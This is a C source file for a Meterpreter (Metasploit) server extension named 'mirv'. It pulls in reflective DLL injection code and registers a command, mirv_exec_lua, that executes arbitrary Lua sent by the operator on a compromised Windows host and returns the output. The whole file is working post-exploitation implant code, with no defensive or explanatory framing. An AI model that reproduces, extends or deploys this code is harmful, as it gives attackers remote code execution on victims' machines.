/*
 * This server feature extension provides:
 *
 *
 */
#include "mirv.h"

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

#include "lua.h"
#include "lualib.h"
#include "lauxlib.h"


// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

DWORD request_mirv_exec_lua(Remote *remote, Packet *packet)
{
	LPCSTR lua_code;
	LPCSTR lua_ret;
	DWORD dwResult    = ERROR_SUCCESS;	
	lua_State *l;	
	Packet * response = NULL;			

	lua_code= packet_get_tlv_value_string(packet,TLV_TYPE_MIRV_LUA_CODE);
	l = luaL_newstate();
	luaL_openlibs(l);

	luaL_dostring(l,lua_code);	

	lua_ret=lua_tostring(l, -1);

	response = packet_create_response( packet );
	packet_add_tlv_string(response,TLV_TYPE_MIRV_LUA_RETMSG,lua_ret);
	packet_transmit_response( dwResult, remote, response );
	return dwResult;
}

Command customCommands[] =
{
	{ "mirv_exec_lua",
	  { request_mirv_exec_lua,                                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
